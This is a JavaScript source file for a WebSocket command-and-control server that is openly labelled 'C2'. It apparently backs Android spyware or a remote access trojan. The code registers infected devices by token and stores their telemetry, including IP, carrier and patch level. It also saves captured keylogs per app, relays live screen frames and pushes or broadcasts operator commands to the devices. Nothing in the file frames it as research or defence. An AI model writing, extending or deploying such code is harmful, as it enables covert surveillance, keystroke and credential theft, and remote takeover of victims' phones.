import { WebSocketServer } from 'ws';
import { v4 as uuidv4 } from 'uuid';
import { log } from '../utils.js';

/**
 * WebSocket C2 Server.
 * 
 * Protocol:
 *   Device connects and sends: { type: 'auth', token: '<device_token>' }
 *   Server responds: { type: 'auth_ok', deviceId: '<uuid>' }
 *   Then bidirectional messages:
 *     Device → Server: { type: 'telemetry', ... }, { type: 'keylog', ... }, { type: 'result', ... }
 *     Server → Device: { type: 'command', id: '<uuid>', payload: '...' }
 * 
 * Heartbeat:
 *   Device sends: { type: 'ping' }
 *   Server responds: { type: 'pong' }
 */
export function createWsServer(httpServer, db, config) {
  const wss = new WebSocketServer({
    server: httpServer,
    maxPayload: 50 * 1024 * 1024, // 50MB max for screen streams
  });

  // Track connected devices: deviceId → { ws, lastSeen, metadata }
  const connectedDevices = new Map();

  wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    let deviceId = null;
    let authenticated = false;
    let heartbeatInterval = null;

    log('info', 'WebSocket connection attempt', { ip: clientIp });

    // -------------------------------------------------------- Message handler
    ws.on('message', (raw) => {
      let msg;
      try {
        msg = JSON.parse(raw.toString());
      } catch {
        ws.send(JSON.stringify({ type: 'error', message: 'Invalid JSON' }));
        return;
      }

      // ---------- Auth
      if (msg.type === 'auth') {
        const device = db.stmts.getDeviceByToken.get(msg.token);
        if (!device) {
          ws.send(JSON.stringify({ type: 'auth_error', message: 'Invalid token' }));
          ws.close();
          return;
        }

        authenticated = true;
        deviceId = device.id;

        // Update device online status
        const now = new Date().toISOString();
        const deviceInfo = msg.device || {};

        db.stmts.upsertDevice.run({
          id: device.id,
          token: msg.token,
          name: deviceInfo.name || device.name || null,
          manufacturer: deviceInfo.manufacturer || device.manufacturer || null,
          model: deviceInfo.model || device.model || null,
          androidVersion: deviceInfo.androidVersion || device.android_version || null,
          sdkVersion: deviceInfo.sdkVersion || device.sdk_version || null,
          securityPatch: deviceInfo.securityPatch || device.security_patch || null,
          carrier: deviceInfo.carrier || device.carrier || null,
          publicIp: clientIp || device.public_ip || null,
          localIp: deviceInfo.localIp || device.local_ip || null,
          signalStrength: deviceInfo.signalStrength ?? device.signal_strength ?? null,
          isOnline: 1,
          lastSeenAt: now,
          batteryLevel: deviceInfo.batteryLevel ?? device.battery_level ?? null,
          isCharging: deviceInfo.isCharging ?? device.is_charging ?? null,
          capabilities: deviceInfo.capabilities ? JSON.stringify(deviceInfo.capabilities) : device.capabilities || '{}',
        });

        // Track connection
        connectedDevices.set(deviceId, { ws, lastSeen: Date.now(), metadata: deviceInfo });

        // Send auth OK + any pending commands
        const pendingCommands = db.stmts.getPendingCommandsForDevice.all(deviceId);
        ws.send(JSON.stringify({
          type: 'auth_ok',
          deviceId: device.id,
          pendingCommands: pendingCommands.map(c => ({
            id: c.id,
            type: c.type,
            payload: c.payload,
          })),
        }));

        // Mark pending commands as sent
        for (const cmd of pendingCommands) {
          db.stmts.updateCommandStatus.run('sent', now, null, null, null, cmd.id);
        }

        log('info', 'Device authenticated', { deviceId, model: device.model || 'unknown' });
        return;
      }

      // Must be authenticated beyond this point
      if (!authenticated) {
        ws.send(JSON.stringify({ type: 'error', message: 'Authenticate first' }));
        return;
      }

      const now = new Date().toISOString();

      // ---------- Ping/Pong
      if (msg.type === 'ping') {
        ws.send(JSON.stringify({ type: 'pong', ts: Date.now() }));
        connectedDevices.get(deviceId).lastSeen = Date.now();
        db.stmts.setDeviceOnline.run(now, deviceId);
        return;
      }

      // ---------- Telemetry update
      if (msg.type === 'telemetry') {
        const tel = msg.payload || {};
        db.stmts.upsertDevice.run({
          id: deviceId,
          token: null,
          name: null,
          manufacturer: tel.manufacturer || null,
          model: tel.model || null,
          androidVersion: tel.androidVersion || null,
          sdkVersion: tel.sdkVersion || null,
          securityPatch: tel.securityPatch || null,
          carrier: tel.carrier || null,
          publicIp: tel.publicIp || clientIp || null,
          localIp: tel.localIp || null,
          signalStrength: tel.signalStrength ?? null,
          isOnline: 1,
          lastSeenAt: now,
          batteryLevel: tel.batteryLevel ?? null,
          isCharging: tel.isCharging ?? null,
          capabilities: tel.capabilities ? JSON.stringify(tel.capabilities) : null,
        });

        connectedDevices.get(deviceId).lastSeen = Date.now();
        return;
      }

      // ---------- Command result
      if (msg.type === 'result') {
        const { commandId, result, error } = msg;
        db.stmts.updateCommandStatus.run(
          error ? 'failed' : 'completed',
          null,
          result || null,
          now,
          error || null,
          commandId
        );
        return;
      }

      // ---------- Keylog
      if (msg.type === 'keylog') {
        const { packageName, keyEvent, text, capturedAt } = msg;
        db.stmts.insertKeylog.run({
          deviceId,
          packageName: packageName || '',
          keyEvent: keyEvent || '',
          text: text || '',
          capturedAt: capturedAt || now,
        });
        return;
      }

      // ---------- Screen stream (binary or base64 chunks)
      if (msg.type === 'screen_frame') {
        // Forward to dashboard consumers watching this device
        const consumers = getDashboardConsumers(deviceId);
        for (const consumer of consumers) {
          try {
            consumer.ws.send(JSON.stringify({
              type: 'screen_frame',
              deviceId,
              data: msg.data,
              timestamp: msg.timestamp,
            }));
          } catch {
            // Consumer disconnected
          }
        }
        return;
      }
    });

    // -------------------------------------------------------- Close handler
    ws.on('close', () => {
      if (deviceId) {
        db.stmts.setDeviceOffline.run(deviceId);
        connectedDevices.delete(deviceId);

        log('info', 'Device disconnected', { deviceId });

        // Notify dashboard consumers
        const consumers = getDashboardConsumers(deviceId);
        for (const consumer of consumers) {
          try {
            consumer.ws.send(JSON.stringify({
              type: 'device_offline',
              deviceId,
            }));
          } catch {
            // ignore
          }
        }
      }

      if (heartbeatInterval) clearInterval(heartbeatInterval);
    });

    // -------------------------------------------------------- Error handler
    ws.on('error', (err) => {
      log('error', 'WebSocket error', { error: err.message, deviceId });
    });

    // -------------------------------------------------------- Heartbeat timeout
    heartbeatInterval = setInterval(() => {
      if (ws.readyState === ws.OPEN) {
        ws.ping();
      }
    }, 30000);
  });

  // ============================================================ Public API

  /**
   * Check if a specific device is connected.
   */
  function isDeviceConnected(deviceId) {
    return connectedDevices.has(deviceId);
  }

  /**
   * Send a command to a connected device.
   * Returns true if the device was connected and the message was sent.
   */
  function sendCommand(deviceId, command) {
    const entry = connectedDevices.get(deviceId);
    if (!entry || entry.ws.readyState !== entry.ws.OPEN) {
      return false;
    }
    try {
      entry.ws.send(JSON.stringify({
        type: 'command',
        id: command.id,
        commandType: command.type,
        payload: command.payload,
      }));
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Send a broadcast command to all connected devices.
   * Returns count of devices that received the message.
   */
  function broadcastCommand(command, groupId) {
    let count = 0;
    for (const [devId, entry] of connectedDevices) {
      if (groupId) {
        const device = db.stmts.getDeviceById.get(devId);
        if (!device || device.group_id !== groupId) continue;
      }
      if (entry.ws.readyState === entry.ws.OPEN) {
        try {
          entry.ws.send(JSON.stringify({
            type: 'command',
            id: command.id,
            commandType: command.type,
            payload: command.payload,
          }));
          count++;
        } catch {
          // skip
        }
      }
    }
    return count;
  }

  /**
   * Get connected device IDs.
   */
  function getConnectedDeviceIds() {
    return Array.from(connectedDevices.keys());
  }

  /**
   * Register a dashboard consumer to receive device streams.
   */
  function registerDashboardConsumer(ws, deviceIds) {
    ws._consuming = deviceIds; // array of device IDs or 'all'
  }

  function getDashboardConsumers(deviceId) {
    // In a real implementation, track dashboard WS connections separately
    return [];
  }

  function close() {
    wss.close();
    for (const [, entry] of connectedDevices) {
      try { entry.ws.close(); } catch {}
    }
    connectedDevices.clear();
  }

  return {
    wss,
    isDeviceConnected,
    sendCommand,
    broadcastCommand,
    getConnectedDeviceIds,
    registerDashboardConsumer,
    close,
  };
}
